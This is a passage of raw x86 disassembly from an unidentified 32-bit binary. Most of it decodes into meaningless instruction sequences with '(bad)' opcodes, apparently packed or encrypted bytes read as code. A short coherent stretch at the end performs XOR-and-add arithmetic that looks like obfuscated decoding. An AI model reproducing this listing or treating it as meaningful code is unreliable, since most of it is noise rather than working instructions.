  4059d2:	inc    edi
  4059d3:	sub    ecx,DWORD PTR [edi]
  4059d5:	repnz adc DWORD PTR fs:[ecx+eax*4-0x51],edi
  4059db:	jnp    0x405a1c
  4059dd:	xor    ah,ah
  4059df:	inc    edi
  4059e0:	adc    BYTE PTR [ebp-0x5f],ah
  4059e3:	sahf   
  4059e4:	sub    ch,BYTE PTR [edx+0x614f2f28]
  4059ea:	mov    bl,0xc4
  4059ec:	int3   
  4059ed:	xor    eax,0x48
  4059f0:	sbb    DWORD PTR [ecx-0x16],edi
  4059f3:	jmp    0x15f0059d
  4059f8:	mov    bh,0x2f
  4059fa:	popf   
  4059fb:	loop   0x4059bd
  4059fd:	mov    cl,0xc
  4059ff:	mov    ah,0x61
  405a01:	mov    bh,0xaf
  405a03:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  405a05:	cli    
  405a06:	or     edx,DWORD PTR [esi]
  405a08:	sti    
  405a09:	lea    ebp,[ebp+0x4f4a0e3]
  405a0f:	stc    
  405a10:	adc    eax,DWORD PTR [esi+0x46062ce3]
  405a16:	ins    BYTE PTR es:[edi],dx
  405a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a18:	cdq    
  405a19:	cmp    eax,0x2418f2ef
  405a1e:	cmc    
  405a1f:	and    al,0x44
  405a21:	jmp    0x6485ee76
  405a26:	iret   
  405a27:	mov    ah,0x8f
  405a29:	je     0x4059fa
  405a2b:	push   0xffffffed
  405a2d:	jbe    0x4059c4
  405a2f:	daa    
  405a30:	jl     0x4059f7
  405a32:	sub    ah,BYTE PTR [eax-0x5a]
  405a35:	in     eax,dx
  405a36:	aaa    
  405a37:	mov    eax,ds:0x555c6e60
  405a3c:	inc    ebx
  405a3d:	xlat   BYTE PTR ds:[ebx]
  405a3e:	iret   
  405a3f:	es repz mov al,0x6e
  405a43:	cli    
  405a44:	sub    DWORD PTR [ebx+esi*2+0x1de8d007],eax
  405a4b:	xchg   edi,eax
  405a4c:	inc    ecx
  405a4d:	outs   dx,DWORD PTR ds:[esi]
  405a4e:	dec    ebx
  405a4f:	stos   BYTE PTR es:[edi],al
  405a50:	cmp    al,0x42
  405a52:	into   
  405a53:	or     eax,0xc593aaf4
  405a58:	enter  0xa013,0x73
  405a5c:	xchg   esi,eax
  405a5d:	dec    esi
  405a5e:	jb     0x405a2c
  405a60:	test   eax,0xe5c9cda8
  405a65:	clc    
  405a66:	imul   ebp,edi,0x0
  405a69:	fidiv  WORD PTR [edi-0x3a]
  405a6c:	mov    bl,0xee
  405a6e:	mov    edi,0x103a828
  405a73:	mov    al,0x68
  405a75:	std    
  405a76:	les    eax,FWORD PTR [ebp+0x35324e8d]
  405a7c:	in     al,dx
  405a7d:	dec    ebx
  405a7e:	mul    al
  405a80:	jl     0x405ace
  405a82:	xchg   edi,eax
  405a83:	dec    ebp
  405a84:	push   es
  405a85:	or     ebp,esp
  405a87:	mov    cl,BYTE PTR [esi-0x75]
  405a8a:	dec    edx
  405a8b:	test   al,0x7c
  405a8d:	dec    edi
  405a8e:	or     DWORD PTR [ebx+0x68],0x71
  405a92:	popa   
  405a93:	icebp  
  405a94:	int3   
  405a95:	shr    BYTE PTR ds:0xbf8c0c9,1
  405a9b:	adc    al,0xb6
  405a9d:	lahf   
  405a9e:	dec    ebx
  405a9f:	ja     0x405a44
  405aa1:	xlat   BYTE PTR ds:[ebx]
  405aa2:	sbb    eax,0x984f4551
  405aa7:	pop    eax
  405aa8:	int3   
  405aa9:	fs xchg esi,eax
  405aab:	inc    edi
  405aac:	cmp    BYTE PTR [ebx+eiz*4-0x2b],dh
  405ab0:	xchg   ebx,eax
  405ab1:	or     BYTE PTR [ecx+0x5f],ch
  405ab4:	jp     0x405a45
  405ab6:	mov    ecx,0xb399fd69
  405abb:	xor    al,0xf4
  405abd:	or     edi,0x2d1af636
  405ac3:	ret    0x4115
  405ac6:	mov    DWORD PTR [esi+edi*2-0x3e],ecx
  405aca:	cmp    DWORD PTR [edi+0x7aadbdc0],0x5b
  405ad1:	sbb    DWORD PTR [ebx],eax
  405ad3:	inc    esi
  405ad4:	fwait
  405ad5:	ror    DWORD PTR [edx-0x41ff2d2c],1
  405adb:	and    dl,BYTE PTR [eax+0x30]
  405ade:	inc    ecx
  405adf:	sbb    ebp,DWORD PTR [ecx]
  405ae1:	sbb    BYTE PTR [ebx+ebx*2+0x5be2a7d6],cl
  405ae8:	sbb    BYTE PTR [ebx],ch
  405aea:	mov    ah,0xbc
  405aec:	push   ecx
  405aed:	or     eax,esp
  405aef:	inc    eax
  405af0:	loop   0x405b33
  405af2:	xchg   ecx,ebx
  405af4:	inc    edx
  405af5:	pop    ecx
  405af6:	in     eax,dx
  405af7:	inc    esi
  405af8:	or     al,0xe4
  405afa:	and    DWORD PTR [edi+0x21],esi
  405afd:	test   cl,bl
  405aff:	push   es
  405b00:	or     eax,0xd134d2cb
  405b05:	cdq    
  405b06:	into   
  405b07:	daa    
  405b08:	inc    esp
  405b09:	pop    esp
  405b0a:	pop    ds
  405b0b:	fadd   QWORD PTR [ebx]
  405b0d:	mov    ecx,ecx
  405b0f:	cmp    DWORD PTR ds:0xe27df83f,eax
  405b15:	add    al,0xee
  405b17:	mov    esp,DWORD PTR [ecx-0x2a]
  405b1a:	mov    eax,ds:0x679f977
  405b1f:	push   ebp
  405b20:	bound  ebp,QWORD PTR [edx-0x40]
  405b23:	pushf  
  405b24:	xchg   esp,eax
  405b25:	sahf   
  405b26:	mov    dl,BYTE PTR [edi]
  405b28:	push   0x7d
  405b2a:	adc    eax,0xb3f6dd84
  405b2f:	cmp    BYTE PTR [edi+eiz*8],ah
  405b32:	push   ebp
  405b33:	sbb    DWORD PTR [eax-0x5f00c71f],eax
  405b39:	mov    eax,ds:0xd49a1c27
  405b3e:	xchg   esp,eax
  405b3f:	rcr    BYTE PTR [eax-0x1a],0xb4
  405b43:	mov    ebx,DWORD PTR [eax+0x5b]
  405b46:	xor    BYTE PTR [ecx],al
  405b48:	jge    0x405b1e
  405b4a:	(bad)  
  405b4b:	dec    ecx
  405b4d:	out    0xa5,al
  405b4f:	xchg   esi,eax
  405b50:	cs lahf 
  405b52:	jbe    0x405ae2
  405b54:	add    bl,BYTE PTR [esi+0x329870d8]
  405b5a:	test   DWORD PTR [ebx+0x68c001ad],ebp
  405b60:	sar    BYTE PTR [ebp-0x41f3de22],1
  405b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b67:	es dec ebp
  405b69:	sbb    DWORD PTR [ebx],edi
  405b6b:	das    
  405b6c:	xor    al,0xe4
  405b6e:	lahf   
  405b6f:	jmp    0x9094ad42
  405b74:	ins    BYTE PTR es:[edi],dx
  405b75:	mov    cl,0x7d
  405b77:	dec    edx
  405b78:	xchg   edx,eax
  405b79:	push   edx
  405b7a:	dec    esi
  405b7b:	jbe    0x405b03
  405b7d:	sar    BYTE PTR [ebp-0x7e],1
  405b80:	cmp    BYTE PTR [edi],0x7a
  405b83:	xchg   ebx,eax
  405b84:	jmp    0x54c6b875
  405b89:	jl     0x405bd0
  405b8b:	fcom   DWORD PTR [esi+edi*1]
  405b8e:	(bad)
  405b91:	call   0xd924:0x118a9dd2
  405b98:	popa   
  405b99:	test   al,0x3
  405b9b:	xchg   esi,eax
  405b9c:	iret   
  405b9d:	pop    ss
  405b9e:	popa   
  405b9f:	push   ecx
  405ba0:	imul   edx,DWORD PTR [eax],0xe449d653
  405ba6:	int    0xed
  405ba8:	jo     0x405bd0
  405baa:	mov    ebx,DWORD PTR [ebx-0x1d]
  405bad:	int    0xc5
  405baf:	leave  
  405bb0:	dec    edi
  405bb1:	(bad)  
  405bb2:	sub    edx,DWORD PTR [ecx+0x57a6234a]
  405bb8:	aaa    
  405bb9:	mov    ebx,0x1daa43b5
  405bbe:	inc    esi
  405bbf:	test   BYTE PTR cs:[esi+0x28],al
  405bc3:	icebp  
  405bc4:	xor    DWORD PTR [edi-0x4f],0x65
  405bc8:	jae    0x405b79
  405bca:	sub    ch,ah
  405bcc:	imul   ecx,DWORD PTR [esi+0x63],0xffffff91
  405bd0:	sub    al,0xab
  405bd2:	mov    ebx,0xa76062a7
  405bd7:	add    BYTE PTR [esi+eiz*4],0x8b
  405bdb:	sar    BYTE PTR [edx],0xd7
  405bde:	ret    0xb4b0
  405be1:	ficomp DWORD PTR [edx]
  405be3:	sbb    dh,al
  405be5:	leave  
  405be6:	adc    eax,0xdbb5d9b3
  405beb:	test   BYTE PTR [edx-0x5d],cl
  405bee:	cmp    DWORD PTR [esi+0x5f49ea7f],0x1e
  405bf5:	xchg   esp,eax
  405bf6:	mov    edi,esp
  405bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bf9:	and    DWORD PTR [edx-0x28],ebx
  405bfc:	out    0xdd,al
  405bfe:	sub    al,0x28
  405c00:	data16 sub BYTE PTR [edx-0x318b8ef2],bh
  405c07:	adc    al,ah
  405c09:	inc    esp
  405c0a:	mov    bh,ah
  405c0c:	data16 gs gs sub al,bh
  405c11:	pusha  
  405c12:	int3   
  405c13:	aas    
  405c14:	stos   BYTE PTR es:[edi],al
  405c15:	sub    eax,0xf3a50ae0
  405c1a:	xchg   ecx,eax
  405c1b:	jp     0x405c32
  405c1d:	mov    dh,0x28
  405c1f:	rol    DWORD PTR [edi-0x35e4ea9b],cl
  405c25:	aaa    
  405c26:	scas   eax,DWORD PTR es:[edi]
  405c27:	arpl   WORD PTR [edx],cx
  405c29:	ret    0x4064
  405c2c:	call   0xa96cd7ed
  405c31:	mov    esp,0x9af9f7e0
  405c36:	or     BYTE PTR [edx-0x6a307fb3],cl
  405c3c:	out    dx,al
  405c3d:	dec    eax
  405c3e:	rcl    BYTE PTR [ebp-0x565f3832],1
  405c44:	pop    es
  405c45:	jo     0x405c1f
  405c47:	push   eax
  405c48:	std    
  405c49:	jno    0x405c14
  405c4b:	xchg   edx,eax
  405c4c:	add    eax,0x84e83aa7
  405c51:	adc    ebx,ebp
  405c53:	sbb    edx,DWORD PTR [ebp-0x38a525ce]
  405c59:	loope  0x405c6c
  405c5b:	inc    ebp
  405c5c:	push   esp
  405c5d:	or     BYTE PTR ds:0x98b3bbb0,bh
  405c63:	jb     0x405c48
  405c65:	mov    al,0x7b
  405c67:	inc    ecx
  405c68:	repz pop es
  405c6a:	fdiv   st,st(6)
  405c6c:	pop    ecx
  405c6d:	in     eax,0xf2
  405c6f:	dec    edi
  405c70:	pushf  
  405c71:	pop    eax
  405c72:	add    BYTE PTR [ebp-0x54aca550],ch
  405c78:	adc    al,al
  405c7a:	or     ebp,DWORD PTR [edx]
  405c7c:	enter  0x1a38,0x75
  405c80:	adc    dl,BYTE PTR [ecx+0x784c0cd5]
  405c86:	add    BYTE PTR [edi+ebp*8],dl
  405c89:	in     eax,dx
  405c8a:	std    
  405c8b:	pop    ds
  405c8c:	pop    ds
  405c8d:	daa    
  405c8e:	xor    DWORD PTR [ecx+0x54],edx
  405c91:	fbld   TBYTE PTR [ebp+0x6b9104b9]
  405c97:	mov    ah,0x33
  405c99:	jnp    0x405c64
  405c9b:	sub    al,0x41
  405c9d:	and    ch,cl
  405c9f:	scas   eax,DWORD PTR es:[edi]
  405ca0:	inc    esp
  405ca1:	sub    ch,cl
  405ca3:	cmc    
  405ca4:	aad    0xf5
  405ca6:	jb     0x405ca3
  405ca8:	xchg   ecx,eax
  405ca9:	push   cs
  405caa:	cmp    bl,al
  405cac:	xchg   BYTE PTR [esi],bh
  405cae:	xchg   edi,eax
  405caf:	xchg   edx,eax
  405cb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cb1:	push   0xe6018a4c
  405cb6:	sahf   
  405cb7:	les    eax,FWORD PTR [esi+0x21]
  405cba:	cmc    
  405cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cbc:	loopne 0x405ce5
  405cbe:	lea    esi,[esi+0x6690c996]
  405cc4:	jmp    0x3dea812f
  405cc9:	test   BYTE PTR [edx+0x4c],bh
  405ccc:	inc    edi
  405ccd:	mov    ebp,0x45a70e50
  405cd2:	es mov edi,0x887c29c9
  405cd8:	outs   dx,BYTE PTR ds:[esi]
  405cd9:	push   ss
  405cda:	fistp  QWORD PTR [ebp-0x1e]
  405cdd:	enter  0x3528,0x14
  405ce1:	sbb    ebp,0x445bc631
  405ce7:	es inc esi
  405ce9:	jb     0x405cae
  405ceb:	popa   
  405cec:	ins    DWORD PTR es:[edi],dx
  405ced:	ins    BYTE PTR es:[edi],dx
  405cee:	push   ecx
  405cef:	aaa    
  405cf0:	addr16 iret 
  405cf2:	jae    0x405c83
  405cf4:	inc    ecx
  405cf5:	mov    al,0x2f
  405cf7:	sti    
  405cf8:	adc    eax,0x978ff63a
  405cfd:	mov    al,ds:0xfe030201
  405d02:	xchg   ebp,esp
  405d04:	mov    ecx,0xbd8fe52e
  405d09:	inc    ebx
  405d0a:	or     BYTE PTR [edi+ecx*8],ah
  405d0d:	cld    
  405d0e:	mov    esi,0x5088c4a3
  405d13:	js     0x405ccb
  405d15:	lods   al,BYTE PTR ds:[esi]
  405d16:	ins    BYTE PTR es:[edi],dx
  405d17:	mov    al,es:0x2fd0d089
  405d1d:	pop    ebp
  405d1e:	xchg   edi,eax
  405d1f:	stc    
  405d20:	(bad)  
  405d22:	stc    
  405d23:	jns    0x405d53
  405d25:	call   0xbc61:0x8af5e60e
  405d2c:	int    0x6b
  405d2e:	xchg   al,bh
  405d30:	mov    WORD PTR [eax-0x1cfcb537],?
  405d36:	fcompp 
  405d38:	or     dh,ch
  405d3a:	dec    ebx
  405d3b:	or     BYTE PTR [ecx+0x99a1191],dl
  405d41:	clc    
  405d42:	and    DWORD PTR [esi+0x65a61a66],eax
  405d48:	xchg   ebp,eax
  405d49:	daa    
  405d4a:	push   ebp
  405d4b:	call   0xe41a:0x38f423c3
  405d52:	into   
  405d53:	push   ebx
  405d54:	sahf   
  405d55:	(bad)  
  405d56:	pop    ds
  405d57:	dec    esp
  405d58:	shr    BYTE PTR [edx],1
  405d5a:	sti    
  405d5b:	mov    ds:0x3caee15b,eax
  405d60:	adc    cl,cl
  405d62:	cs into 
  405d64:	push   edx
  405d65:	call   0x94632ba8
  405d6a:	xchg   ebp,eax
  405d6b:	cmp    BYTE PTR [ecx-0x4e],bh
  405d6e:	out    dx,eax
  405d6f:	in     al,dx
  405d70:	add    DWORD PTR [ecx],esi
  405d72:	dec    ecx
  405d73:	or     al,0xbe
  405d75:	sub    BYTE PTR cs:0xe1a856e2,dl
  405d7c:	xor    ebp,ebx
  405d7e:	push   edx
  405d7f:	outs   dx,BYTE PTR gs:[esi]
  405d81:	lods   eax,DWORD PTR ds:[esi]
  405d82:	test   DWORD PTR [ebx*4+0x5b71c32],ecx
  405d89:	lahf   
  405d8a:	pop    esp
  405d8b:	and    al,0xb3
  405d8d:	jmp    0x405d13
  405d8f:	pop    ebp
  405d90:	addr16 xchg ecx,eax
  405d92:	nop
  405d93:	repnz sbb al,dl
  405d96:	add    eax,0xb6ca2195
  405d9b:	inc    esi
  405d9c:	addr16 inc eax
  405d9e:	lahf   
  405d9f:	les    ebx,FWORD PTR [ebx-0x5b]
  405da2:	xlat   BYTE PTR ds:[ebx]
  405da3:	mov    BYTE PTR [edx+0x6303fd88],bh
  405da9:	repz pop ebp
  405dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dac:	push   esi
  405dad:	leave  
  405dae:	push   ecx
  405daf:	jnp    0x405daa
  405db1:	lods   al,BYTE PTR ds:[esi]
  405db2:	xor    eax,0xb8288b61
  405db7:	mov    ch,0xcf
  405db9:	cmp    DWORD PTR [esi+0x37],edi
  405dbc:	in     al,0xc6
  405dbe:	outs   dx,BYTE PTR ds:[esi]
  405dbf:	push   ecx
  405dc0:	nop
  405dc1:	(bad)  [ebp-0x3fdc3803]
  405dc7:	gs (bad) 
  405dc9:	cld    
  405dca:	sub    BYTE PTR [ecx-0x6e],0x26
  405dce:	jnp    0x405da3
  405dd0:	mov    edx,0x5fd795d3
  405dd5:	out    dx,al
  405dd6:	sub    edi,DWORD PTR [ebp-0x42]
  405dd9:	xor    bl,BYTE PTR [ebx-0x25c1a96a]
  405ddf:	pop    esi
  405de0:	rcr    DWORD PTR [esi],1
  405de2:	jg     0x405e2c
  405de4:	sub    cl,BYTE PTR [ebx]
  405de6:	dec    ecx
  405de7:	mov    fs,WORD PTR [ebx]
  405de9:	mov    eax,ebx
  405deb:	mov    ch,0xf4
  405ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dee:	inc    ecx
  405def:	mov    WORD PTR [edi-0x43f453bb],es
  405df5:	bound  ebx,QWORD PTR es:[edx+0x6c883251]
  405dfc:	jg     0x405e61
  405dfe:	sar    eax,0xa6
  405e01:	cmp    dl,bh
  405e03:	add    BYTE PTR [ebp+0x4eff8ba6],bl
  405e09:	cmp    DWORD PTR [ebx],0x6b6ca5d6
  405e0f:	imul   esi,ebx,0x7
  405e12:	cwde   
  405e13:	(bad)  
  405e14:	fisubr WORD PTR [ecx+0x4b05eb42]
  405e1a:	pop    eax
  405e1b:	shr    DWORD PTR [edi-0x1b1a0ff9],1
  405e21:	xor    ah,dh
  405e23:	adc    BYTE PTR [edx-0x6646c0bf],ah
  405e29:	jecxz  0x405e42
  405e2b:	jnp    0x405dcd
  405e2d:	jge    0x405de7
  405e2f:	jge    0x405e13
  405e31:	pop    ebx
  405e32:	ret    0x2052
  405e35:	pop    ds
  405e36:	xor    ecx,ebp
  405e38:	adc    edi,DWORD PTR [edx]
  405e3a:	pusha  
  405e3b:	das    
  405e3c:	push   ecx
  405e3d:	test   BYTE PTR [edx-0x3b24f2a4],al
  405e43:	nop
  405e44:	fwait
  405e45:	mov    ebx,0x4fdbcdaa
  405e4a:	scas   eax,DWORD PTR es:[edi]
  405e4b:	aam    0x3f
  405e4d:	dec    esi
  405e4e:	or     DWORD PTR [esi-0x54],esp
  405e51:	or     al,0x7b
  405e53:	(bad)  
  405e54:	adc    eax,0x71caecf2
  405e59:	sub    eax,0x3bb5b898
  405e5e:	mov    dh,0xc4
  405e60:	paddsb mm2,QWORD PTR [ebx+0x7c]
  405e64:	ror    BYTE PTR [ebx+0x2e],cl
  405e67:	and    eax,0x135dc132
  405e6c:	inc    edi
  405e6d:	aam    0xad
  405e6f:	mov    al,ds:0xaf0426a8
  405e74:	in     al,dx
  405e75:	hlt    
  405e76:	out    0xd2,al
  405e78:	test   ebp,esp
  405e7a:	cmp    eax,eax
  405e7c:	gs xor eax,0x5119e598
  405e82:	sahf   
  405e83:	xchg   esi,eax
  405e84:	fdiv   QWORD PTR [esp+edx*8+0x29]
  405e88:	add    edx,DWORD PTR [ebx+0x2c]
  405e8b:	inc    ebp
  405e8c:	outs   dx,DWORD PTR ds:[esi]
  405e8d:	jge    0x405e9c
  405e8f:	push   edi
  405e90:	imul   BYTE PTR [ecx+ecx*2]
  405e93:	sub    BYTE PTR [ecx],dl
  405e95:	add    BYTE PTR [ebp-0x53b28a8c],0x79
  405e9c:	int    0x3c
  405e9e:	sbb    eax,0x94ff2e94
  405ea3:	and    esp,DWORD PTR [esi]
  405ea5:	push   edx
  405ea6:	mov    bl,0xcf
  405ea8:	xchg   BYTE PTR [esi],al
  405eaa:	sbb    bh,BYTE PTR [ebx+0x4d]
  405ead:	rcl    BYTE PTR [edx+ecx*4],0xe8
  405eb1:	call   DWORD PTR [eax+edx*1]
  405eb4:	fstp   QWORD PTR [edx]
  405eb6:	out    dx,eax
  405eb7:	sahf   
  405eb8:	dec    ebx
  405eb9:	mov    gs,WORD PTR [ebx+0x4d86d0ff]
  405ebf:	std    
  405ec0:	mov    ds:0x92830cbe,al
  405ec5:	inc    si
  405ec7:	test   al,0x11
  405ec9:	mov    bh,0xf8
  405ecb:	int    0xf7
  405ecd:	xchg   BYTE PTR [esi+0x2c507324],bh
  405ed3:	repz loope 0x405e6d
  405ed6:	mul    DWORD PTR [esi-0x1e2e951c]
  405edc:	into   
  405edd:	fisubr DWORD PTR [esi]
  405edf:	sar    bh,0x8b
  405ee2:	into   
  405ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee4:	inc    ecx
  405ee5:	xchg   edi,eax
  405ee6:	mov    al,0x64
  405ee8:	les    eax,FWORD PTR [ebp+0x51]
  405eeb:	add    al,0xeb
  405eed:	and    dl,dh
  405eef:	lahf   
  405ef0:	dec    esp
  405ef1:	mov    ch,0xd0
  405ef3:	arpl   WORD PTR [ebx+0x575440bd],di
  405ef9:	or     BYTE PTR [esi-0x2],dl
  405efc:	mov    eax,DWORD PTR [esi-0x2e3b7fb5]
  405f02:	aas    
  405f03:	mov    esi,0x8be04bd8
  405f08:	dec    edx
  405f09:	imul   ecx,DWORD PTR [edi+esi*8-0x7f],0xbf34ccc2
  405f11:	mov    dh,0xaa
  405f13:	and    al,0xc6
  405f15:	cs sbb al,bh
  405f18:	mov    DWORD PTR [edx+0x611cbb64],edx
  405f1e:	sub    ebp,DWORD PTR [ecx+ebx*8+0x4f4de9b9]
  405f25:	add    DWORD PTR [ebp+esi*8+0x47f08185],ecx
  405f2c:	fisttp WORD PTR [edx]
  405f2e:	adc    bh,BYTE PTR [eax+0x3c]
  405f31:	jmp    0xdffce6e5
  405f36:	aaa    
  405f37:	fist   DWORD PTR [ecx]
  405f39:	push   cs
  405f3a:	inc    ebx
  405f3b:	ins    DWORD PTR es:[edi],dx
  405f3c:	mov    edx,?
  405f3e:	jecxz  0x405f20
  405f40:	pop    eax
  405f41:	dec    esi
  405f42:	dec    edi
  405f43:	ret    0xb953
  405f46:	sbb    eax,0x72c3aa51
  405f4b:	loopne 0x405f11
  405f4d:	sti    
  405f4e:	or     al,0x6b
  405f50:	xchg   BYTE PTR [edi],dl
  405f52:	inc    edx
  405f53:	push   0xa3cd238b
  405f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f59:	push   eax
  405f5a:	(bad)  
  405f5b:	jp     0x405f4c
  405f5d:	rol    BYTE PTR [ebx],cl
  405f5f:	ret    
  405f60:	or     al,0x5d
  405f62:	jmp    0x405fa8
  405f64:	pop    ds
  405f65:	push   ss
  405f66:	fadd   QWORD PTR [eax-0x7c]
  405f69:	clc    
  405f6a:	ins    DWORD PTR es:[edi],dx
  405f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f6c:	mov    eax,ds:0x14191ddc
  405f71:	xchg   edx,eax
  405f72:	ss fwait
  405f74:	daa    
  405f75:	inc    eax
  405f76:	inc    esp
  405f77:	(bad)  
  405f78:	push   ss
  405f79:	adc    DWORD PTR [edx-0x32347d59],esi
  405f7f:	sbb    esi,DWORD PTR [eax+0x20]
  405f82:	and    ebp,DWORD PTR [eax+esi*4-0x58]
  405f86:	cdq    
  405f87:	sbb    BYTE PTR [eax+0x3],al
  405f8a:	push   ss
  405f8b:	(bad)  
  405f8c:	fnstcw WORD PTR [edx]
  405f8e:	sbb    bh,dl
  405f90:	loopne 0x405f52
  405f92:	jmp    0x405f3b
  405f94:	in     al,0xd0
  405f96:	mov    cl,BYTE PTR [edi-0x45]
  405f99:	fimul  DWORD PTR [esi+0x1e280a53]
  405f9f:	inc    edi
  405fa0:	push   0x57
  405fa2:	add    eax,edi
  405fa4:	xlat   BYTE PTR ds:[ebx]
  405fa5:	fs aas 
  405fa7:	and    al,0x46
  405fa9:	xor    cl,ch
  405fab:	inc    edi
  405fac:	imul   ebp,ecx,0xa8af210a
  405fb2:	les    ebp,FWORD PTR [eax+0x3]
  405fb5:	inc    edi
  405fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fb7:	test   al,0x7a
  405fb9:	inc    edi
  405fba:	and    eax,0x95a3cdf6
  405fbf:	out    0xad,eax
  405fc1:	rol    BYTE PTR [edx],0x60
  405fc4:	shl    DWORD PTR [edi+edx*1-0x46ce9e01],1
  405fcb:	dec    BYTE PTR [esi-0x60ec5ae3]
  405fd1:	xor    DWORD PTR [edx+eax*4],edx
  405fd4:	push   ebp
  405fd5:	(bad)  
  405fd8:	push   cs
  405fd9:	add    bl,BYTE PTR [ecx]
  405fdb:	pusha  
  405fdc:	or     al,0xa7
  405fde:	out    0x3d,eax
  405fe0:	arpl   WORD PTR [edx-0x7f],dx
  405fe3:	sub    DWORD PTR [ebp+0x51],0x774465f4
  405fea:	retf   0xa8a
  405fed:	mov    eax,ds:0x5325d72b
  405ff2:	out    dx,eax
  405ff3:	scas   al,BYTE PTR es:[edi]
  405ff4:	inc    ecx
  405ff5:	pop    eax
  405ff6:	mov    dh,0x99
  405ff8:	sub    ch,BYTE PTR [ebp-0x4d5861cc]
  405ffe:	test   eax,0xc5f351b9
  406003:	mov    DWORD PTR [ebx-0x526f2182],ebp
  406009:	cs inc ebx
  40600b:	clc    
  40600c:	sti    
  40600d:	pop    edx
  40600e:	or     BYTE PTR fs:[eax-0x14],ah
  406012:	rol    DWORD PTR [edx],0xf8
  406015:	jmp    0x406013
  406017:	push   ecx
  406018:	sbb    esi,DWORD PTR [ebx+0x17]
  40601b:	das    
  40601c:	xor    dh,cl
  40601e:	rol    DWORD PTR [eax+0x5502bead],cl
  406024:	xchg   DWORD PTR [ebx],esp
  406026:	push   ds
  406027:	xor    al,0x2d
  406029:	shl    BYTE PTR [ebx+0x40],0x8a
  40602d:	inc    esp
  40602e:	fsubr  QWORD PTR [ecx-0x6c]
  406031:	mov    DWORD PTR [edi+0x4ddf8997],edi
  406037:	sub    eax,0x48c73bf9
  40603c:	lahf   
  40603d:	dec    edi
  40603e:	frstor [eax+0x765ab249]
  406044:	jmp    0x840eddee
  406049:	mov    ebx,edi
  40604b:	push   edi
  40604c:	sbb    BYTE PTR [ebp+0x5a],bh
  40604f:	ret    0x6ed5
  406052:	daa    
  406053:	add    eax,ebp
  406055:	fsubr  st(2),st
  406057:	inc    eax
  406058:	aad    0xf
  40605a:	mov    WORD PTR [eax-0x25922e5],?
  406060:	aam    0x32
  406062:	mov    eax,0xcf79bfd7
  406067:	imul   ebp,DWORD PTR [esi+0x6ed3d54d]
  40606e:	(bad)  
  40606f:	cmp    ebp,DWORD PTR [esi+0x4e]
  406072:	out    0xe8,eax
  406074:	pop    eax
  406075:	push   ebx
  406076:	sbb    eax,0x648140ae
  40607b:	xor    esp,DWORD PTR es:[eax]
  40607e:	xchg   ebp,eax
  40607f:	nop
  406080:	mov    al,0xb0
  406082:	push   0xd1fe677f
  406087:	imul   edi,DWORD PTR [edx+esi*4],0xf6d40908
  40608e:	or     DWORD PTR ds:0x828030e6,0x5b
  406095:	jmp    0xe4d3:0x5ce0a8d6
  40609c:	mov    dl,0x14
  40609e:	push   ecx
  40609f:	fwait
  4060a0:	out    dx,eax
  4060a1:	hlt    
  4060a2:	bound  edi,QWORD PTR [esi-0xc37e83]
  4060a8:	pop    ecx
  4060a9:	mov    edx,0x29e6d6f4
  4060ae:	jp     0x4060a9
  4060b0:	mov    esi,0x2953b4fa
  4060b5:	mov    ds:0xeec8908e,al
  4060ba:	in     al,dx
  4060bb:	jns    0x4060a7
  4060bd:	jle    0x4060a8
  4060bf:	fwait
  4060c0:	xor    al,0x76
  4060c2:	fsubr  DWORD PTR [esi-0x6a]
  4060c5:	mov    al,ds:0x3464c1b6
  4060ca:	out    dx,al
  4060cb:	inc    ecx
  4060cc:	int    0xc4
  4060ce:	shr    ah,1
  4060d0:	pop    eax
  4060d1:	out    dx,eax
  4060d2:	ss push ebp
  4060d4:	shr    BYTE PTR [eax+eax*8-0x24094f40],1
  4060db:	add    DWORD PTR [ecx-0x47667a6a],ecx
  4060e1:	mov    ds:0xfe89b8c6,al
  4060e6:	push   ebx
  4060e7:	fs repz inc esp
  4060ea:	adc    bh,BYTE PTR fs:[ecx+0x207ed306]
  4060f1:	mov    edx,0xaee1497d
  4060f6:	stos   DWORD PTR es:[edi],eax
  4060f7:	jae    0x4060d5
  4060f9:	pop    edx
  4060fa:	add    cl,BYTE PTR [edx+0x2f]
  4060fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060fe:	fdiv   QWORD PTR [eax-0x689f0694]
  406104:	push   es
  406105:	jae    0x406130
  406107:	mov    BYTE PTR [edx+ebx*1],al
  40610a:	mov    eax,DWORD PTR [ebp-0x40]
  40610d:	mov    edx,DWORD PTR [ebp-0x28]
  406110:	xor    eax,esi
  406112:	xor    edx,esi
  406114:	add    eax,edi
  406116:	add    edx,edi
  406118:	imul   eax,edx
  40611b:	add    eax,DWORD PTR [ebp-0xc]
  40611e:	mov    DWORD PTR [ebp-0xc],eax
  406121:	mov    eax,DWORD PTR [ebp-0xc]
  406124:	mov    edx,DWORD PTR [ebp-0x18]
  406127:	cmp    edx,eax
  406129:	jb     0x403ce7
  40612f:	mov    eax,DWORD PTR [ebp-0x28]
  406132:	mov    edx,DWORD PTR [ebp-0x18]
  406135:	xor    eax,esi
  406137:	add    eax,edi
  406139:	imul   eax,edx
  40613c:	mov    edx,DWORD PTR [ebp-0x1c]
  40613f:	xor    edx,esi
  406141:	add    edx,edi
  406143:	or     eax,edx
  406145:	mov    edx,DWORD PTR [ebp-0x20]
  406148:	xor    edx,esi
  40614a:	add    eax,edx
  40614c:	mov    edx,DWORD PTR [ebp-0x20]
  40614f:	xor    edx,esi
  406151:	add    eax,edx
  406153:	mov    edx,DWORD PTR [ebp-0x10]
  406156:	lea    eax,[eax+edx*1+0x64e5ea]
  40615d:	jmp    0x406171
  406162:	mov    eax,DWORD PTR [ebp-0x20]
  406165:	mov    edx,DWORD PTR [ebp-0x10]
  406168:	xor    eax,esi
  40616a:	lea    eax,[eax+edx*1+0x3272f5]
